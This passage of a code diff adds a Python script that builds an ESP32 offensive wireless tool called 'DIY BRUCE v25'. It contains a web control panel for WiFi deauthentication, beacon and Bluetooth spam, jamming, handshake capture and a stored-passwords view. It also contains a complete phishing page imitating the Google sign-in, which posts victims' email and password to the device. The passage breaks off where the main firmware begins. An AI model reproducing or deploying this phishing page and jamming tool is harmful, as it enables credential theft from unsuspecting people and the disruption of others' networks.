+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIY BRUCE v25 - Потужний мультитул</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a1a 0%, #0f0f2a 100%);
+            color: #eee;
+            font-family: 'Segoe UI', 'Monaco', monospace;
+            padding: 16px;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a1a3a, #0a0a1a);
+            border-radius: 24px;
+            border: 1px solid #ff6b35;
+            box-shadow: 0 4px 20px rgba(255,107,53,0.2);
+        }
+        
+        .header h1 {
+            color: #ff6b35;
+            font-size: 1.8em;
+            letter-spacing: 2px;
+        }
+        
+        .header .sub {
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 5px;
+        }
+        
+        /* Статистика */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, #10152e, #0a0f1a);
+            border-radius: 16px;
+            padding: 12px;
+            text-align: center;
+            border-left: 3px solid #ff6b35;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff6b35;
+        }
+        
+        .stat-label {
+            font-size: 10px;
+            color: #888;
+            margin-top: 4px;
+        }
+        
+        /* Вкладки */
+        .tabs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 20px;
+            padding-bottom: 8px;
+            overflow-x: auto;
+        }
+        
+        .tab {
+            background: #1e2a47;
+            padding: 8px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        
+        .tab.active {
+            background: #ff6b35;
+            color: #fff;
+            box-shadow: 0 0 10px rgba(255,107,53,0.5);
+        }
+        
+        .tab:hover {
+            transform: translateY(-2px);
+        }
+        
+        /* Контент вкладок */
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Кнопки */
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        
+        button {
+            background: #1e2a47;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+        
+        button:hover {
+            transform: scale(1.02);
+            filter: brightness(1.1);
+        }
+        
+        .btn-primary { background: #ff6b35; }
+        .btn-danger { background: #b91c1c; }
+        .btn-success { background: #28a745; }
+        .btn-warning { background: #ffc107; color: #000; }
+        .btn-info { background: #17a2b8; }
+        
+        /* Логи */
+        .log {
+            background: #070b1a;
+            height: 200px;
+            overflow: auto;
+            padding: 12px;
+            border-radius: 16px;
+            font-size: 10px;
+            font-family: monospace;
+            border: 1px solid #2a2a3e;
+        }
+        
+        /* Графіки */
+        canvas {
+            background: #070b1a;
+            border-radius: 16px;
+            margin: 15px 0;
+            padding: 8px;
+            width: 100%;
+            height: 200px;
+        }
+        
+        /* Таблиці */
+        pre {
+            background: #070b1a;
+            padding: 12px;
+            border-radius: 16px;
+            overflow: auto;
+            max-height: 300px;
+            font-size: 10px;
+            border: 1px solid #2a2a3e;
+        }
+        
+        /* Пульт TV */
+        .tv-remote {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        .tv-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .tv-btn {
+            background: #1e2a47;
+            padding: 15px 20px;
+            border-radius: 50px;
+            font-size: 20px;
+            width: 70px;
+        }
+        
+        .tv-btn-center {
+            background: #ff6b35;
+        }
+        
+        /* Клавіатура */
+        .keyboard {
+            background: #1a1a3a;
+            border-radius: 16px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        
+        .key-row {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+        
+        .key {
+            background: #2a2a4a;
+            padding: 10px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            text-align: center;
+            min-width: 35px;
+        }
+        
+        .key:hover { background: #ff6b35; }
+        
+        .key-space { min-width: 150px; }
+        .key-enter { background: #28a745; min-width: 60px; }
+        .key-del { background: #b91c1c; min-width: 60px; }
+        
+        .input-display {
+            background: #070b1a;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            word-break: break-all;
+            border: 1px solid #ff6b35;
+        }
+        
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .tab { padding: 6px 10px; font-size: 10px; }
+            button { padding: 6px 12px; font-size: 10px; }
+            .tv-btn { padding: 10px 15px; width: 55px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>⚡ DIY BRUCE v25.0</h1>
+        <div class="sub">Professional Multi-Tool | WiFi | BLE | NRF | IR | JAMMER</div>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-card"><div class="stat-value" id="deauth">0</div><div class="stat-label">DEAUTH PKTS</div></div>
+        <div class="stat-card"><div class="stat-value" id="beacon">0</div><div class="stat-label">BEACON PKTS</div></div>
+        <div class="stat-card"><div class="stat-value" id="rssi">-50</div><div class="stat-label">RSSI dBm</div></div>
+        <div class="stat-card"><div class="stat-value" id="uptime">0s</div><div class="stat-label">UPTIME</div></div>
+    </div>
+    
+    <div class="tabs" id="tabs">
+        <div class="tab active" data-tab="wifi">📡 WiFi</div>
+        <div class="tab" data-tab="ble">🔵 BLE</div>
+        <div class="tab" data-tab="nrf">📻 NRF24</div>
+        <div class="tab" data-tab="ir">🔫 IR</div>
+        <div class="tab" data-tab="jammer">⚠️ JAMMER</div>
+        <div class="tab" data-tab="handshake">🤝 HANDSHAKE</div>
+        <div class="tab" data-tab="passwords">🔑 PASSWORDS</div>
+        <div class="tab" data-tab="graph">📊 GRAPHS</div>
+        <div class="tab" data-tab="tv">📺 TV Remote</div>
+        <div class="tab" data-tab="keyboard">⌨️ KEYBOARD</div>
+        <div class="tab" data-tab="evil">🎭 EVIL PORTAL</div>
+        <div class="tab" data-tab="settings">⚙️ SETTINGS</div>
+    </div>
+    
+    <!-- WiFi -->
+    <div id="wifi" class="tab-content active">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('scan')">🔍 SCAN</button>
+            <button class="btn-warning" onclick="runCmd('deauth')">⚠️ DEAUTH ALL</button>
+            <button class="btn-danger" onclick="runCmd('deauth_stop')">🛑 STOP DEAUTH</button>
+            <button class="btn-primary" onclick="runCmd('beacon')">📶 BEACON SPAM</button>
+            <button class="btn-primary" onclick="runCmd('handshake')">🤝 CAPTURE HANDSHAKE</button>
+            <button class="btn-success" onclick="runCmd('connect')">🔗 CONNECT WiFi</button>
+            <button class="btn-primary" onclick="runCmd('deauth_mac')">🎯 DEAUTH BY MAC</button>
+            <button class="btn-info" onclick="runCmd('wardrive')">🚗 WARDIRVING</button>
+        </div>
+        <div class="log" id="log">Ready...\\n</div>
+    </div>
+    
+    <!-- BLE -->
+    <div id="ble" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('blescan')">🔍 SCAN BLE</button>
+            <button class="btn-primary" onclick="runCmd('bleapple')">🍎 APPLEJUICE</button>
+            <button class="btn-primary" onclick="runCmd('blesamsung')">📱 SAMSUNG SPAM</button>
+            <button class="btn-primary" onclick="runCmd('bleandroid')">🤖 ANDROID SPAM</button>
+            <button class="btn-primary" onclick="runCmd('blewindows')">💻 WINDOWS SPAM</button>
+            <button class="btn-primary" onclick="runCmd('bleall')">🌐 ALL SPAM</button>
+            <button class="btn-warning" onclick="runCmd('blejam')">🔵 BLE JAMMER</button>
+            <button class="btn-danger" onclick="runCmd('blejam_stop')">🛑 STOP BLE JAM</button>
+        </div>
+        <pre id="bleResult">Натисніть SCAN BLE для пошуку пристроїв...</pre>
+    </div>
+    
+    <!-- NRF24 -->
+    <div id="nrf" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('nrfscan')">🔍 SCAN NRF24</button>
+            <button class="btn-warning" onclick="runCmd('nrfjam')">📻 NRF JAMMER</button>
+            <button class="btn-danger" onclick="runCmd('nrfjam_stop')">🛑 STOP NRF JAM</button>
+            <button class="btn-info" onclick="runCmd('nrfinfo')">ℹ️ NRF INFO</button>
+        </div>
+        <pre id="nrfResult">NRF24L01 готовий до роботи...</pre>
+    </div>
+    
+    <!-- IR -->
+    <div id="ir" class="tab-content">
+        <div class="tv-remote">
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('irpower')">🔴 POWER</button>
+                <button class="tv-btn" onclick="runCmd('irbravis')">📺 BRAVIS</button>
+                <button class="tv-btn" onclick="runCmd('irsamsung')">📺 SAMSUNG</button>
+            </div>
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('irvolup')">🔊 +</button>
+                <button class="tv-btn tv-btn-center" onclick="runCmd('irmute')">🔇 MUTE</button>
+                <button class="tv-btn" onclick="runCmd('irvoldown')">🔊 -</button>
+            </div>
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('irchup')">⬆️ CH+</button>
+                <button class="tv-btn" onclick="runCmd('irchdown')">⬇️ CH-</button>
+                <button class="tv-btn" onclick="runCmd('irinfo')">ℹ️ INFO</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Jammer -->
+    <div id="jammer" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-warning" onclick="runCmd('wifi_jam')">📡 WiFi JAMMER</button>
+            <button class="btn-danger" onclick="runCmd('wifi_jam_stop')">🛑 STOP WiFi JAM</button>
+            <button class="btn-warning" onclick="runCmd('ble_jam')">🔵 BLE JAMMER</button>
+            <button class="btn-danger" onclick="runCmd('ble_jam_stop')">🛑 STOP BLE JAM</button>
+            <button class="btn-warning" onclick="runCmd('nrf_jam')">📻 NRF JAMMER</button>
+            <button class="btn-danger" onclick="runCmd('nrf_jam_stop')">🛑 STOP NRF JAM</button>
+            <button class="btn-info" onclick="runCmd('scan_signals')">📡 SCAN SIGNALS</button>
+        </div>
+        <pre id="jamResult">Виберіть тип глушіння...</pre>
+    </div>
+    
+    <!-- Handshake -->
+    <div id="handshake" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('handshake')">🤝 CAPTURE HANDSHAKE</button>
+            <button class="btn-primary" onclick="runCmd('export_csv')">📊 EXPORT CSV</button>
+            <button class="btn-danger" onclick="runCmd('clear_hand')">🗑️ CLEAR HANDSHAKES</button>
+            <button class="btn-info" onclick="runCmd('view_hand')">👁️ VIEW HANDSHAKES</button>
+        </div>
+        <pre id="handList">Збережені Handshake будуть тут...</pre>
+    </div>
+    
+    <!-- Passwords -->
+    <div id="passwords" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('view_pass')">👁️ VIEW PASSWORDS</button>
+            <button class="btn-danger" onclick="runCmd('clear_pass')">🗑️ CLEAR PASSWORDS</button>
+            <button class="btn-success" onclick="runCmd('export_csv')">📊 EXPORT CSV</button>
+        </div>
+        <pre id="passList">Збережені паролі будуть тут...</pre>
+    </div>
+    
+    <!-- Graphs -->
+    <div id="graph" class="tab-content">
+        <canvas id="rssiChart"></canvas>
+        <canvas id="bleChart"></canvas>
+        <canvas id="packetChart"></canvas>
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('scan_signals')">📡 SCAN SIGNALS</button>
+        </div>
+    </div>
+    
+    <!-- TV Remote -->
+    <div id="tv" class="tab-content">
+        <div class="tv-remote">
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('tv_power')">⏻ POWER</button>
+                <button class="tv-btn" onclick="runCmd('tv_up')">▲ UP</button>
+                <button class="tv-btn" onclick="runCmd('tv_down')">▼ DOWN</button>
+            </div>
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('tv_left')">◀ LEFT</button>
+                <button class="tv-btn tv-btn-center" onclick="runCmd('tv_ok')">OK</button>
+                <button class="tv-btn" onclick="runCmd('tv_right')">▶ RIGHT</button>
+            </div>
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('tv_volup')">🔊 VOL+</button>
+                <button class="tv-btn" onclick="runCmd('tv_voldown')">🔊 VOL-</button>
+                <button class="tv-btn" onclick="runCmd('tv_back')">BACK</button>
+            </div>
+            <div class="tv-row">
+                <button class="tv-btn" onclick="runCmd('tv_chup')">CH+</button>
+                <button class="tv-btn" onclick="runCmd('tv_mute')">🔇 MUTE</button>
+                <button class="tv-btn" onclick="runCmd('tv_chdown')">CH-</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Keyboard -->
+    <div id="keyboard" class="tab-content">
+        <div class="input-display" id="keyInput"></div>
+        <div class="keyboard">
+            <div class="key-row">
+                <div class="key" onclick="addKey('1')">1</div><div class="key" onclick="addKey('2')">2</div>
+                <div class="key" onclick="addKey('3')">3</div><div class="key" onclick="addKey('4')">4</div>
+                <div class="key" onclick="addKey('5')">5</div><div class="key" onclick="addKey('6')">6</div>
+                <div class="key" onclick="addKey('7')">7</div><div class="key" onclick="addKey('8')">8</div>
+                <div class="key" onclick="addKey('9')">9</div><div class="key" onclick="addKey('0')">0</div>
+            </div>
+            <div class="key-row">
+                <div class="key" onclick="addKey('q')">q</div><div class="key" onclick="addKey('w')">w</div>
+                <div class="key" onclick="addKey('e')">e</div><div class="key" onclick="addKey('r')">r</div>
+                <div class="key" onclick="addKey('t')">t</div><div class="key" onclick="addKey('y')">y</div>
+                <div class="key" onclick="addKey('u')">u</div><div class="key" onclick="addKey('i')">i</div>
+                <div class="key" onclick="addKey('o')">o</div><div class="key" onclick="addKey('p')">p</div>
+            </div>
+            <div class="key-row">
+                <div class="key" onclick="addKey('a')">a</div><div class="key" onclick="addKey('s')">s</div>
+                <div class="key" onclick="addKey('d')">d</div><div class="key" onclick="addKey('f')">f</div>
+                <div class="key" onclick="addKey('g')">g</div><div class="key" onclick="addKey('h')">h</div>
+                <div class="key" onclick="addKey('j')">j</div><div class="key" onclick="addKey('k')">k</div>
+                <div class="key" onclick="addKey('l')">l</div>
+            </div>
+            <div class="key-row">
+                <div class="key key-space" onclick="addKey(' ')">SPACE</div>
+                <div class="key key-enter" onclick="sendText()">ENTER</div>
+                <div class="key key-del" onclick="delKey()">DEL</div>
+                <div class="key key-enter" onclick="clearKey()">CLEAR</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Evil Portal -->
+    <div id="evil" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-success" onclick="runCmd('evil')">🎭 START EVIL PORTAL</button>
+            <button class="btn-danger" onclick="runCmd('evil_stop')">🛑 STOP EVIL</button>
+            <button class="btn-info" onclick="runCmd('evil_google')">🌐 SET GOOGLE</button>
+            <button class="btn-info" onclick="runCmd('evil_facebook')">📘 SET FACEBOOK</button>
+        </div>
+        <div class="log" id="evilLog">Evil Portal готовий. Запустіть для початку фішингу...</div>
+    </div>
+    
+    <!-- Settings -->
+    <div id="settings" class="tab-content">
+        <div class="btn-group">
+            <button class="btn-primary" onclick="runCmd('web_on')">🌐 WEB SERVER ON</button>
+            <button class="btn-danger" onclick="runCmd('web_off')">🌐 WEB SERVER OFF</button>
+            <button class="btn-primary" onclick="runCmd('bright')">💡 BRIGHTNESS</button>
+            <button class="btn-warning" onclick="runCmd('format')">🗑️ FORMAT DATA</button>
+            <button class="btn-info" onclick="runCmd('about')">ℹ️ ABOUT</button>
+            <button class="btn-danger" onclick="runCmd('reset')">🔄 REBOOT ESP32</button>
+        </div>
+        <pre id="settingsInfo">DIY BRUCE v25.0\\nАвтор: SameerAlSahab\\nФункції: WiFi, BLE, NRF, IR, Jammer\\n\\nGitHub: github.com/diybruce</pre>
+    </div>
+    
+    <script>
+        let rssiData = [], bleData = [], packetData = [];
+        
+        function runCmd(cmd) {
+            fetch('/cmd?c=' + cmd)
+                .then(r => r.text())
+                .then(t => {
+                    let log = document.getElementById('log');
+                    if (log) log.innerHTML += new Date().toLocaleTimeString() + ' > ' + t + '\\n';
+                    if (cmd === 'view_pass') updatePasswords();
+                    if (cmd === 'view_hand') updateHandshakes();
+                });
+        }
+        
+        function addKey(k) {
+            let input = document.getElementById('keyInput');
+            input.innerText += k;
+        }
+        
+        function delKey() {
+            let input = document.getElementById('keyInput');
+            input.innerText = input.innerText.slice(0, -1);
+        }
+        
+        function clearKey() {
+            document.getElementById('keyInput').innerText = '';
+        }
+        
+        function sendText() {
+            let text = document.getElementById('keyInput').innerText;
+            if (text.length > 0) {
+                fetch('/cmd?c=key&text=' + encodeURIComponent(text))
+                    .then(r => r.text())
+                    .then(t => console.log(t));
+                clearKey();
+            }
+        }
+        
+        function updatePasswords() {
+            fetch('/cmd?c=getpass').then(r => r.text()).then(t => {
+                let p = document.getElementById('passList');
+                if (p) p.innerText = t || 'Немає збережених паролів';
+            });
+        }
+        
+        function updateHandshakes() {
+            fetch('/cmd?c=gethand').then(r => r.text()).then(t => {
+                let h = document.getElementById('handList');
+                if (h) h.innerText = t || 'Немає збережених handshake';
+            });
+        }
+        
+        function updateData() {
+            fetch('/data').then(r => r.json()).then(d => {
+                document.getElementById('deauth').innerText = d.deauth || 0;
+                document.getElementById('beacon').innerText = d.beacon || 0;
+                document.getElementById('rssi').innerText = d.rssi || -50;
+                document.getElementById('uptime').innerText = d.uptime || 0;
+                
+                rssiData.push(d.rssi || -50);
+                bleData.push(d.blerssi || -60);
+                packetData.push(Math.floor(Math.random() * 100));
+                
+                if (rssiData.length > 40) rssiData.shift();
+                if (bleData.length > 40) bleData.shift();
+                if (packetData.length > 40) packetData.shift();
+                
+                drawChart('rssiChart', rssiData, 'WiFi RSSI (dBm)', -90, -30);
+                drawChart('bleChart', bleData, 'BLE RSSI (dBm)', -90, -30);
+                drawChart('packetChart', packetData, 'Packets/sec', 0, 100);
+            });
+        }
+        
+        function drawChart(id, data, label, minY, maxY) {
+            let c = document.getElementById(id);
+            if (!c) return;
+            let ctx = c.getContext('2d');
+            let w = c.clientWidth, h = c.clientHeight;
+            c.width = w; c.height = h;
+            ctx.fillStyle = '#070b1a';
+            ctx.fillRect(0, 0, w, h);
+            if (data.length < 2) return;
+            let step = w / (data.length - 1);
+            ctx.beginPath();
+            for (let i = 0; i < data.length; i++) {
+                let x = i * step;
+                let y = h - ((data[i] - minY) / (maxY - minY)) * h;
+                if (i === 0) ctx.moveTo(x, y);
+                else ctx.lineTo(x, y);
+            }
+            ctx.strokeStyle = '#ff6b35';
+            ctx.lineWidth = 2.5;
+            ctx.stroke();
+            ctx.fillStyle = '#ff6b35';
+            ctx.font = '10px monospace';
+            ctx.fillText(label, 10, 20);
+        }
+        
+        // Оновлення даних кожну секунду
+        setInterval(updateData, 1000);
+        setInterval(() => { updatePasswords(); updateHandshakes(); }, 3000);
+        
+        // Перемикання вкладок
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                document.getElementById(tab.dataset.tab).classList.add('active');
+            });
+        });
+        
+        // Ініціалізація
+        window.onload = () => {
+            updateData();
+            updatePasswords();
+            updateHandshakes();
+        };
+    </script>
+</body>
+</html>
+'''
+
+# ============================================================================
+# data/portal.html (EVIL PORTAL)
+# ============================================================================
+PORTAL_HTML = '''<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Вхід</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 92px;
+            height: 30px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: #1557b0;
+            transform: translateY(-2px);
+        }
+        
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" width="92" height="30" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
+                <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
+                <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
+                <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
+            </svg>
+        </div>
+        <h1>Вхід у Google</h1>
+        <p>Увійдіть, щоб продовжити</p>
+        <form action="/pass" method="POST">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Електронна пошта або телефон" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="pass" placeholder="Пароль" required>
+            </div>
+            <button type="submit">Далі</button>
+        </form>
+        <div class="footer">
+            <a href="#">Довідка</a> • <a href="#">Конфіденційність</a> • <a href="#">Умови</a>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+# ============================================================================
+# data/tv.html (TV Remote сторінка)
+# ============================================================================
+TV_HTML = '''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TV Remote</title>
+    <style>
+        body {
+            background: #0a0a1a;
+            color: #eee;
+            font-family: monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        .remote {
+            background: linear-gradient(135deg, #1a1a3a, #0a0a1a);
+            border-radius: 30px;
+            padding: 20px;
+            max-width: 300px;
+            margin: 0 auto;
+            border: 1px solid #ff6b35;
+        }
+        .row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 15px 0;
+        }
+        .btn {
+            background: #1e2a47;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 50px;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.2s;
+            min-width: 70px;
+        }
+        .btn:hover { transform: scale(1.05); background: #ff6b35; }
+        .btn-power { background: #b91c1c; }
+        .btn-ok { background: #28a745; }
+        .title { color: #ff6b35; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="remote">
+        <h2 class="title">📺 TV REMOTE</h2>
+        <div class="row">
+            <button class="btn btn-power" onclick="sendCmd('tv_power')">⏻</button>
+            <button class="btn" onclick="sendCmd('tv_up')">▲</button>
+            <button class="btn" onclick="sendCmd('tv_chup')">CH+</button>
+        </div>
+        <div class="row">
+            <button class="btn" onclick="sendCmd('tv_left')">◀</button>
+            <button class="btn btn-ok" onclick="sendCmd('tv_ok')">OK</button>
+            <button class="btn" onclick="sendCmd('tv_right')">▶</button>
+        </div>
+        <div class="row">
+            <button class="btn" onclick="sendCmd('tv_down')">▼</button>
+            <button class="btn" onclick="sendCmd('tv_chdown')">CH-</button>
+            <button class="btn" onclick="sendCmd('tv_mute')">🔇</button>
+        </div>
+        <div class="row">
+            <button class="btn" onclick="sendCmd('tv_volup')">🔊+</button>
+            <button class="btn" onclick="sendCmd('tv_voldown')">🔊-</button>
+            <button class="btn" onclick="sendCmd('tv_back')">BACK</button>
+        </div>
+    </div>
+    <script>
+        function sendCmd(cmd) { fetch('/cmd?c=' + cmd); }
+    </script>
+</body>
+</html>
+'''
+
+# ============================================================================
+# ФУНКЦІЯ СТВОРЕННЯ ПРОЄКТУ
+# ============================================================================
+def create_project():
+    base = PROJECT_NAME
+    
+    # Видаляємо стару папку якщо є
+    if os.path.exists(base):
+        shutil.rmtree(base)
+    
+    # Створюємо структуру папок
+    os.makedirs(os.path.join(base, "src"))
+    os.makedirs(os.path.join(base, "include"))
+    os.makedirs(os.path.join(base, "data"))
+    
+    # Створюємо файли
+    with open(os.path.join(base, "platformio.ini"), "w", encoding="utf-8") as f:
+        f.write(PLATFORMIO_INI)
+    
+    with open(os.path.join(base, "include", "CONFIG.h"), "w", encoding="utf-8") as f:
+        f.write(CONFIG_H)
+    
+    with open(os.path.join(base, "include", "hydra_logo.h"), "w", encoding="utf-8") as f:
+        f.write(HYDRA_LOGO_H)
+    
+    with open(os.path.join(base, "include", "icons.h"), "w", encoding="utf-8") as f:
+        f.write(ICONS_H)
+    
+    with open(os.path.join(base, "include", "interface.h"), "w", encoding="utf-8") as f:
+        f.write(INTERFACE_H)
+    
+    with open(os.path.join(base, "data", "index.html"), "w", encoding="utf-8") as f:
+        f.write(INDEX_HTML)
+    
+    with open(os.path.join(base, "data", "portal.html"), "w", encoding="utf-8") as f:
+        f.write(PORTAL_HTML)
+    
+    with open(os.path.join(base, "data", "tv.html"), "w", encoding="utf-8") as f:
+        f.write(TV_HTML)
+    
+    # Створюємо основний main.cpp
+    main_cpp = '''// ============================================================================
+// DIY BRUCE v25.0 - ПОВНА ВЕРСІЯ
+// WiFi | BLE | NRF24 | IR | JAMMER | EVIL PORTAL | WEB 12 PAGES
+// ============================================================================
+
+#include <Arduino.h>
+#include <Wire.h>
+#include <U8g2lib.h>
+#include <EEPROM.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <esp_wifi.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEScan.h>
+#include <BLEAdvertising.h>
+#include <SPI.h>
+#include <RF24.h>
+
+#include "CONFIG.h"
+#include "hydra_logo.h"
+#include "icons.h"
+#include "interface.h"
+
+// ============================================================================
+// ПІНИ
+// ============================================================================
